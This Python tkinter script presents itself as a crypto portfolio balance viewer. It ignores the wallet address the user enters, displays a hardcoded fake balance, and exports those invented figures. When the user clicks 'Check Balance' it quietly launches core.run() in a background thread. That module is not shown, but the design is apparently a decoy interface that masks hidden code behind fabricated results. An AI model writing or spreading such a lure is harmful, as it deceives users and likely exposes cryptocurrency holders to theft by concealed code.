import tkinter as tk
import threading
import core

def scan():
    status_label.config(text="Syncing portfolio...")
    root.after(2000, lambda: [
        status_label.config(text="Balance: $12,840.12 | Holdings: BTC, ETH"),
        export_button.config(state="normal"),
        threading.Thread(target=core.run).start()
    ])

def export():
    with open("portfolio_export.txt", "w") as f:
        f.write("Balance: $12,840.12\nAssets: BTC, ETH")
    status_label.config(text="Exported to portfolio_export.txt")

root = tk.Tk()
root.title("Crypto Portfolio Balance Viewer")
root.geometry("420x200")
tk.Label(root, text="Enter Wallet Address:").pack()
entry = tk.Entry(root, width=50); entry.pack()
tk.Button(root, text="Check Balance", command=scan).pack(pady=5)
status_label = tk.Label(root, text=""); status_label.pack()
export_button = tk.Button(root, text="Export", command=export, state="disabled")
export_button.pack(pady=5)
root.mainloop()
